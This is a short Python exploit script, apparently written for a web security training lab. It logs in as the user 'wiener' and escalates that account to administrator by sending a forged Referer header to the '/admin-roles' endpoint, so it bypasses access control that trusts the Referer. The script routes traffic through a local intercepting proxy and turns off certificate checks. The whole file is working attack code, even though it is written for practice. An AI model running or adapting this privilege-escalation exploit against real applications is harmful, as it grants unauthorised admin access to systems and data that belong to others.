import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def upgrade_wiener_user(s, url):

    #login as wiener user
    login_url = url + "/login"
    data = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data, proxies=proxies, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) User 'wiener' logged in successfully.")

        # Upgrade wiener user to admin
        print("(+) Upgrading 'wiener' user to admin...")
        upgrade_url = url + "/admin-roles?username=wiener&action=upgrade"
        headers = {"Referer" : url + "/admin"}
        r = s.get(upgrade_url, headers=headers, proxies=proxies, verify=False)
        if r.status_code == 200:
            print("(+) 'wiener' user upgraded to admin successfully.")
        else:
            print("(-) Failed to upgrade 'wiener' user to admin. Status code: %d" % r.status_code)
            print("(-) Exiting the script.")
            sys.exit(-1)
    else:
        print("(-) Failed to log in as 'wiener'. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    upgrade_wiener_user(s, url)

if __name__ == "__main__":
    main()